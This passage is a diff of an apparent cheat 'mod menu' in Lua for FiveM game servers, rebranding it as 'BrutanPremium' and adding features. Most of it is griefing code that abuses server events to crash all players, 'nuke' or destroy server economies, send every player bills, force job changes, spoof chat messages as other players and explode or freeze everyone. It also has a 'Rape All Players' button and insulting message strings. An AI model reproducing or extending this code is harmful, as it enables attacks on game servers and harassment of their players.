+                elseif BrutanPremium.Button("Nuke Server") then
                     nukeserver()
-				elseif Plane.Button("Esx Destroy V2") then
+				elseif BrutanPremium.Button("Esx Destroy V2") then
 				    esxdestroyv2()
-				elseif Plane.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
-                    local amount1 = KeyboardInput("Enter Amount", "", 100000000)
-                    local name1 = KeyboardInput("Enter the name of the Bill", "", 100000000)
-                    if amount1 and name1 then
+				elseif BrutanPremium.Button("~g~ESX SEND EVERYONE A CUSTOM BILL") then
+                    local amount = KeyboardInput("Enter Amount", "", 100000000)
+                    local name = KeyboardInput("Enter the name of the Bill", "", 100000000)
+                    if amount and name then
                     for i = 0, 128 do
-                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name1, amount1)
+                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", name, amount)
                     end
 				end
-				elseif Plane.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
+				elseif BrutanPremium.Button("~g~ESX SEND EVERYONE TONS OF BILLS") then
 				for i = 0, 128 do
-                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu https://discordapp.com/invite/tCEajtn", "6969696969")
-					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu https://discordapp.com/invite/tCEajtn", "6969696969")
-					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu https://discordapp.com/invite/tCEajtn", "6969696969")
-					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu https://discordapp.com/invite/tCEajtn", "6969696969")
-					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "BRUTAN menu https://discordapp.com/invite/tCEajtn", "6969696969")
+                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Brutan Premium, BRUTAN ON YOUTUBE", "99999999")
                 end
-				elseif Plane.Button("VRP Destroy V2") then
+				elseif BrutanPremium.Button("VRP Destroy V2") then
 				    vrpdestroy()
-                elseif Plane.Button("Rape All Players") then
+                elseif BrutanPremium.Button("Rape All Players") then
                     RapeAllFunc()
-                elseif Plane.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
-				elseif Plane.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
-                elseif Plane.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
-			    elseif Plane.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
-                elseif Plane.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
-                elseif Plane.Button("Crash All Players") then
+                elseif BrutanPremium.CheckBox("Explode Everyone", blowall, function(enabled) blowall = enabled end) then
+                elseif BrutanPremium.Button('Make~s~ EVERYONE A Wall') then
+                    for i = 0, 128 do
+                        if IsPedInAnyVehicle(GetPlayerPed(i), true) then
+                            local eb = 'xs_prop_hamburgher_wl'
+                            local ec = -145066854
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetVehiclePedIsIn(GetPlayerPed(i), false),
+                                GetEntityBoneIndexByName(GetVehiclePedIsIn(GetPlayerPed(i), false), 'chassis'),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        else
+                            local eb = 'xs_prop_hamburgher_wl'
+                            local ec = GetHashKey(eb)
+                            while not HasModelLoaded(ec) do
+                                Citizen.Wait(0)
+                                RequestModel(ec)
+                            end
+                            local ed = CreateObject(ec, 0, 0, 0, true, true, true)
+                            AttachEntityToEntity(
+                                ed,
+                                GetPlayerPed(i),
+                                GetPedBoneIndex(GetPlayerPed(i), 0),
+                                0,
+                                0,
+                                -1.0,
+                                0.0,
+                                0.0,
+                                0,
+                                true,
+                                true,
+                                false,
+                                true,
+                                1,
+                                true
+                            )
+                        end
+                    end
+				elseif BrutanPremium.CheckBox("Fuck economy ~g~ESX", esxdestroy, function(enabled) esxdestroy = enabled end) then
+                elseif BrutanPremium.CheckBox("Freeze Everyone", fall, function(enabled) fall = enabled end) then
+			    elseif BrutanPremium.CheckBox("Handcuff everyone", freezeall, function(enabled) freezeall = enabled end) then
+                elseif BrutanPremium.CheckBox("Spawn stuff On Everyone", sall, function(enabled) sall = enabled end) then
+                elseif BrutanPremium.Button("Crash All Players") then
                     for i = 0, 128 do
                         if not ped == GetPlayerPed(-1) then
                             CrashPlayer(GetPlayerPed(i))
                         end
                     end
-                elseif Plane.Button("Fake Message") then
+                elseif BrutanPremium.Button("Fake Message") then
                     local da=KeyboardInput("Enter player name","",100)
                     if da then
                         local ck=KeyboardInput("Enter message","",1000)
@@ -4446,28 +6107,28 @@ Citizen.CreateThread(
                             TriggerServerEvent("_chat:messageEntered",da,{0,0x99,255},ck)
                         end
                     end
-                elseif Plane.Button("ESX Set All Police") then
+                elseif BrutanPremium.Button("ESX Set All Police") then
                     for i = 0, 128 do
                         TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "police", 3)
                         TriggerServerEvent("NB:recruterplayer", i, "police", 3)
                     end
-                elseif Plane.Button("ESX Set All Mechanic") then
+                elseif BrutanPremium.Button("ESX Set All Mechanic") then
                     for i = 0, 128 do
                         TriggerServerEvent("NB:recruterplayer", GetPlayerServerId(i), "mecano", 3)
                         TriggerServerEvent("NB:recruterplayer", i, "mecano", 3)
                     end
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("TeleportMenu") then
-                if Plane.Button("Teleport To Waypoint") then
+                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("TeleportMenu") then
+                if BrutanPremium.Button("~b~TP~s~ To Your Waypoint") then
                     TeleportToWaypoint()
-                elseif Plane.Button("Teleport Into Nearest Vehicle") then
+                elseif BrutanPremium.Button("~b~TP~s~ Into Nearest Vehicle") then
                     teleportToNearestVehicle()
-                elseif Plane.Button("Teleport To Coords") then
+                elseif BrutanPremium.Button("~b~TP~s~ To Coordinates") then
                     TeleportToCoords()
-                elseif Plane.CheckBox(
-                    "Show Coords",
+                elseif BrutanPremium.CheckBox(
+                    "Show Your Coordinates",
                     showCoords,
                     function(enabled)
                         showCoords = enabled
@@ -4475,26 +6136,26 @@ Citizen.CreateThread(
                 then
                 end
 
-                Plane.Display()
-			elseif Plane.IsMenuOpened("AI") then
-			                if Plane.Button("~h~Configure AI ~g~Speed") then
+                BrutanPremium.Display()
+			elseif BrutanPremium.IsMenuOpened("AI") then
+			                if BrutanPremium.Button("~h~Configure The ~g~Speed") then
                     cspeed = KeyboardInput("Enter Wanted MaxSpeed", "", 100)
 					local c1 = 1.0
 					cspeed = tonumber(cspeed)
 					if cspeed == nil then
 											drawNotification(
-                            '~h~~r~Invalid Speed~s~.'
+                            '~~r~Invalid Speed you dumbass~s~.'
                         )
                         drawNotification(
-                            '~h~~r~Operation cancelled~s~.'
+                            '~r~Operation cancelled~s~.'
                         )
                     elseif cspeed then
-                        aispeed = (cspeed .. ".0")
-                        SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(aispeed))
+                        ojtgh = (cspeed .. ".0")
+                        SetDriveTaskMaxCruiseSpeed(GetPlayerPed(-1), tonumber(ojtgh))
                     end
 					
                     SetDriverAbility(GetPlayerPed(-1), 100.0)
-                elseif Plane.Button("~h~AI Drive (Waypoint_Slow)") then
+                elseif BrutanPremium.Button("Drive to waypoint ~o~SLOW") then
                     if DoesBlipExist(GetFirstBlipInfoId(8)) then
                         local blipIterator = GetBlipInfoIdIterator(8)
                         local blip = GetFirstBlipInfoId(8, blipIterator)
@@ -4502,11 +6163,11 @@ Citizen.CreateThread(
                         local ped = GetPlayerPed(-1)
                         ClearPedTasks(ped)
                         local v = GetVehiclePedIsIn(ped, false)
-                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 5, 1.0, true)
+                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 5, 1.0, true)
                         SetDriveTaskDrivingStyle(ped, 8388636)
                         speedmit = true
                     end
-                elseif Plane.Button("~h~AI Drive (Waypoint_Fast)") then
+                elseif BrutanPremium.Button("Drive to waypoint ~g~FAST") then
                     if DoesBlipExist(GetFirstBlipInfoId(8)) then
                         local blipIterator = GetBlipInfoIdIterator(8)
                         local blip = GetFirstBlipInfoId(8, blipIterator)
@@ -4514,17 +6175,17 @@ Citizen.CreateThread(
                         local ped = GetPlayerPed(-1)
                         ClearPedTasks(ped)
                         local v = GetVehiclePedIsIn(ped, false)
-                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(aispeed), 156, v, 2883621, 5.5, true)
+                        TaskVehicleDriveToCoord(ped, v, wp.x, wp.y, wp.z, tonumber(ojtgh), 156, v, 2883621, 5.5, true)
                         SetDriveTaskDrivingStyle(ped, 2883621)
                         speedmit = true
                     end
-                elseif Plane.Button("~h~AI Drive (Wander)") then
+                elseif BrutanPremium.Button("Wander Around") then
                     local ped = GetPlayerPed(-1)
                     ClearPedTasks(ped)
                     local v = GetVehiclePedIsIn(ped, false)
-                    print("Configured speed is currently " .. aispeed)
-                    TaskVehicleDriveWander(ped, v, tonumber(aispeed), 8388636)
-                elseif Plane.Button("~h~Stop AI") then
+                    print("Configured speed is currently " .. ojtgh)
+                    TaskVehicleDriveWander(ped, v, tonumber(ojtgh), 8388636)
+                elseif BrutanPremium.Button("~h~~r~Stop AI") then
                     speedmit = false
                     if IsPedInAnyVehicle(GetPlayerPed(-1)) then
                         ClearPedTasks(GetPlayerPed(-1))
@@ -4532,39 +6193,17 @@ Citizen.CreateThread(
                         ClearPedTasksImmediately(GetPlayerPed(-1))
 				    end
 				end
-				                Plane.Display()
-            elseif Plane.IsMenuOpened("VehMenu") then
-                if Plane.Button("Repair Vehicle") then
-                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
-                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
-                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
-                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
-                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
-					elseif Plane.Button("Repair Engine Only") then
-					    local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
-    if not DoesEntityExist(veh) then
-        drawNotification(
-            "You are not sitting in a vehicle mate"
-        )
-    else
-				SetVehicleUndriveable(veh,false)
-				SetVehicleEngineHealth(veh, 1000.0)
-				SetVehiclePetrolTankHealth(veh, 1000.0)
-				healthEngineLast=1000.0
-				healthPetrolTankLast=1000.0
-					SetVehicleEngineOn(veh, true, false )
-				SetVehicleOilLevel(veh, 1000.0)
-		end
-						elseif Plane.Button("~g~Buy vehicle for free") then fv()
-					elseif
-					Plane.CheckBox(
-					"~w~Rainbow Vehicle Colour",
-					RainbowVeh,
-					function(enabled)
-					RainbowVeh = enabled
-					end)
-				then
-                elseif Plane.Button("Spawn a vehicle") then
+				                BrutanPremium.Display()
+            elseif BrutanPremium.IsMenuOpened("VehMenu") then
+						if BrutanPremium.Button("Remote Car") then
+			RCCAR123 = KeyboardInput("Enter Car Name", "", 1000000)
+			            if RCCAR123 and IsModelValid(RCCAR123) and IsModelAVehicle(RCCAR123) then
+			RCCar.Start()
+                    else
+                        drawNotification("~r~Model Isn't Valid You Tard")
+                    end
+              elseif BrutanPremium.MenuButton('~r~→  ~s~Vehicle List', 'CarTypes') then
+		 elseif BrutanPremium.Button("Spawn A Custom Vehicle") then
                     local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 100)
                     if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
                         RequestModel(ModelName)
@@ -4575,18 +6214,80 @@ Citizen.CreateThread(
                         local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(PlayerPedId()), GetEntityHeading(PlayerPedId()), true, true)
                         if DelCurVeh then
                             DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
-                            drawNotification("Vehicle Deleted")
+                            drawNotification("Vehicle Just Got Deleted")
                         end
                             SetPedIntoVehicle(PlayerPedId(), veh, -1)
 					local playerPed = GetPlayerPed(-1)
 					local playerVeh = GetVehiclePedIsIn(playerPed, true)
 						SetVehicleNumberPlateText(playerVeh, "BRUTAN")
                     else
-                        drawNotification("~r~Model is not valid!")
+                        drawNotification("~r~Model Isn't Valid You Tard")
                     end
-                elseif Plane.MenuButton("LS Customs", "LSC") then
+            elseif BrutanPremium.Button("Repair Vehicle") then
+                    SetVehicleFixed(GetVehiclePedIsIn(GetPlayerPed(-1), false))
+                    SetVehicleDirtLevel(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0.0)
+                    SetVehicleLights(GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
+                    SetVehicleBurnout(GetVehiclePedIsIn(GetPlayerPed(-1), false), false)
+                    Citizen.InvokeNative(0x1FD09E7390A74D54, GetVehiclePedIsIn(GetPlayerPed(-1), false), 0)
+					elseif BrutanPremium.Button("Repair Engine Only") then
+					    local veh = GetVehiclePedIsIn(GetPlayerPed(-1), false)
+    if not DoesEntityExist(veh) then
+        drawNotification(
+            "~r~You Aren't Sitting In A Vehicle Stupid"
+        )
+    else
+				SetVehicleUndriveable(veh,false)
+				SetVehicleEngineHealth(veh, 1000.0)
+				SetVehiclePetrolTankHealth(veh, 1000.0)
+				healthEngineLast=1000.0
+				healthPetrolTankLast=1000.0
+					SetVehicleEngineOn(veh, true, false )
+				SetVehicleOilLevel(veh, 1000.0)
+		end
+						elseif BrutanPremium.Button("~g~Buy vehicle for free") then fv()
+				elseif
+					BrutanPremium.CheckBox(
+					"~r~~h~Ultra Speed",
+					Nigubdddddd,
+					function(enabled)
+					Nigubdddddd = enabled
+					end)
+				then
+					elseif
+					BrutanPremium.CheckBox(
+					"~w~Rainbow Vehicle Colour",
+					RainbowVeh,
+					function(enabled)
+					RainbowVeh = enabled
+					end)
+				then
+				elseif
+					BrutanPremium.CheckBox(
+					"~w~Rainbow Vehicle Neon",
+					ou328hNeon,
+					function(enabled)
+					ou328hNeon = enabled
+					end)
+				then
+				elseif
+					BrutanPremium.CheckBox(
+					"~w~Rainbow Sync",
+					ou328hSync,
+					function(enabled)
+					ou328hSync = enabled
+					end)
+				then
+				elseif
+					BrutanPremium.CheckBox(
+					"Keep Vehicle Clean",
+					LOJWDNDDNDN,
+					function(enabled)
+					LOJWDNDDNDN = enabled
+					end)
+				then
+                elseif BrutanPremium.MenuButton("~r~→  ~s~LS Customs", "LSC") then
 				                elseif
-                    Plane.CheckBox(
+                    BrutanPremium.CheckBox(
                         'Speedboost ~g~SHIFT ~r~CTRL',
                         VehSpeed,
                         function(dl)
@@ -4594,10 +6295,13 @@ Citizen.CreateThread(
                         end
                     )
                  then
-                elseif Plane.Button("Delete Vehicle") then
+                elseif BrutanPremium.Button("Delete Vehicle") then
                     DelVeh(GetVehiclePedIsUsing(PlayerPedId()))
+				elseif BrutanPremium.Button("Delete Closest Vehicle") then
+                        local PlayerCoords = GetEntityCoords(PlayerPedId())
+                        DelVeh(GetClosestVehicle(PlayerCoords.x, PlayerCoords.y, PlayerCoords.z, 1000.0, 0, 4))
 				elseif
-					Plane.CheckBox(
+					BrutanPremium.CheckBox(
 						"No Fall",
 						Nofall,
 						function(enabled)
@@ -4607,32 +6311,177 @@ Citizen.CreateThread(
 						end
 					)
 				 then
-				elseif Plane.Button("Change license plate") then
+				elseif BrutanPremium.Button("Change license plate") then
 					local playerPed = GetPlayerPed(-1)
 					local playerVeh = GetVehiclePedIsIn(playerPed, true)
 					local result = KeyboardInput("Enter the plate license you want", "", 10)
 					if result then
 						SetVehicleNumberPlateText(playerVeh, result)
 						end
-						                elseif Plane.CheckBox(
+						                elseif BrutanPremium.CheckBox(
                     "Vehicle Godmode",
                     VehGod,
                     function(enabled)
                         VehGod = enabled
                     end)
                 then
-				elseif Plane.Button("~h~Make vehicle dirty") then
+				elseif BrutanPremium.Button("Flip Up Vehicle") then
+				local ped = GetPlayerPed(-1)
+		        local veh = GetVehiclePedIsIn(ped)
+	             FreezeEntityPosition(veh,false)
+	             SetVehicleOnGroundProperly(veh)
+	            SetVehicleEngineOn(veh, true)
+				elseif BrutanPremium.Button("Make vehicle dirty") then
 					Clean(GetVehiclePedIsUsing(PlayerPedId()))
-					drawNotification("Vehicle is now dirty")
-				elseif Plane.Button("~h~Make vehicle clean") then
+					drawNotification("~r~Vehicle is now dirty")
+				elseif BrutanPremium.Button("Make vehicle clean") then
 					Clean2(GetVehiclePedIsUsing(PlayerPedId()))
-					drawNotification("Vehicle is now clean")
+					drawNotification("~r~Vehicle is now clean")
                 end
 
-                Plane.Display()
-            elseif Plane.IsMenuOpened("LSC") then
+                BrutanPremium.Display()
+			elseif BrutanPremium.IsMenuOpened("tunings") then 
+                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
+                    for i, dA in pairs(bd) do
+                        if dA.
+                    id == "extra"
+                    and# checkValidVehicleExtras()  ~= 0 then
+                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "neon"
+                    then
+                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "paint"
+                    then
+                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "wheeltypes" 
+                    then
+                    if BrutanPremium.MenuButton(dA.name, dA.id) then end elseif dA.id == "headlight"
+                    then
+                    if BrutanPremium.MenuButton(dA.name, dA.id) then end
+                    else local as = checkValidVehicleMods(dA.id) for dG, dH in pairs(as) do
+                        if BrutanPremium.MenuButton(dA.name, dA.id) then end;
+                    break end end end;
+                    if IsToggleModOn(veh, 22) then xenonStatus = "Installed"
+                    else xenonStatus = "Not Installed"
+                    end;
+                    if BrutanPremium.Button("Xenon Headlight", xenonStatus) then
+                    if not IsToggleModOn(veh, 22) then ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22))
+                    else ToggleVehicleMod(veh, 22, not IsToggleModOn(veh, 22)) end end; 
+                    
+                    BrutanPremium.Display() 
+                elseif BrutanPremium.IsMenuOpened("performance") then 
+                    veh = GetVehiclePedIsUsing(PlayerPedId()) 
+                    for i, dA in pairs(be) do
+                        if BrutanPremium.MenuButton(dA.name, dA.id) then 
+                        end 
+                    end
+                    if IsToggleModOn(veh, 18) then 
+                        turboStatus = "Installed"
+                    else 
+                        turboStatus = "Not Installed"
+                    end
+                    if BrutanPremium.Button("Turbo Tune", turboStatus) then
+                        if not IsToggleModOn(veh, 18) then 
+                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18))
+                        else 
+                            ToggleVehicleMod(veh, 18, not IsToggleModOn(veh, 18)) 
+                        end 
+                    end 
+                    BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("primary") then BrutanPremium.MenuButton("~r~→  ~s~Classic", "classic1") BrutanPremium.MenuButton("~r~→  ~s~Metallic", "metallic1") BrutanPremium.MenuButton("~r~→  ~s~Matte", "matte1") BrutanPremium.MenuButton("~r~→  ~s~Metal", "metal1") BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("secondary") then BrutanPremium.MenuButton("~r~→  ~s~Classic", "classic2") BrutanPremium.MenuButton("~r~→  ~s~Metallic", "metallic2") BrutanPremium.MenuButton("~r~→  ~s~Matte", "matte2") BrutanPremium.MenuButton("~r~→  ~s~Metal", "metal2") BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("rimpaint") then BrutanPremium.MenuButton("~r~→  ~s~Classic", "classic3") BrutanPremium.MenuButton("~r~→  ~s~Metallic", "metallic3") BrutanPremium.MenuButton("~r~→  ~s~Matte", "matte3") BrutanPremium.MenuButton("~r~→  ~s~Metal", "metal3") BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("classic1") then
+                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and tp == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metallic1") then
+                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if tp ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and tp == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("matte1") then
+                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if tp ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and tp == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metal1") then
+                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if tp ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and tp == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) SetVehicleColours(veh, dT.id, oldsec) b8 = true elseif b8 and curprim == dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = false; ba = -1; b9 = -1 elseif b8 and curprim ~= dT.id then SetVehicleColours(veh, dT.id, oldsec) SetVehicleExtraColours(veh, dT.id, oldwheelcolour) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("classic2") then
+                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metallic2") then
+                    for dS, dT in pairs(bg) do tp, ts = GetVehicleColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("matte2") then
+                    for dS, dT in pairs(bi) do tp, ts = GetVehicleColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metal2") then
+                    for dS, dT in pairs(bj) do tp, ts = GetVehicleColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; curprim, cursec = GetVehicleColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) b9 = table.pack(oldprim, oldsec) SetVehicleColours(veh, oldprim, dT.id) b8 = true elseif b8 and cursec == dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and cursec ~= dT.id then SetVehicleColours(veh, oldprim, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("classic3") then
+                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("metallic3") then
+                    for dS, dT in pairs(bg) do _, ts = GetVehicleExtraColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
+                    if not b8 then ba = "paint"
+                    bc = false; oldprim, oldsec = GetVehicleColours(veh) oldpearl, oldwheelcolour = GetVehicleExtraColours(veh) b9 = table.pack(oldprim, oldsec, oldpearl, oldwheelcolour) SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true elseif b8 and currims == dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = false; ba = -1; b9 = -1 elseif b8 and currims ~= dT.id then SetVehicleExtraColours(veh, oldpearl, dT.id) b8 = true end end end; BrutanPremium.Display() elseif BrutanPremium.IsMenuOpened("matte3") then
+                    for dS, dT in pairs(bi) do _, ts = GetVehicleExtraColours(veh) if ts ==
+                    dT.id and not b8 then pricetext = "Installed"
+                    else if b8 and ts == dT.id then pricetext = "Previewing"
+                    else pricetext = "Not Installed"
+                    end end; _, currims = GetVehicleExtraColours(veh) if BrutanPremium.Button(dT.name, pricetext) then
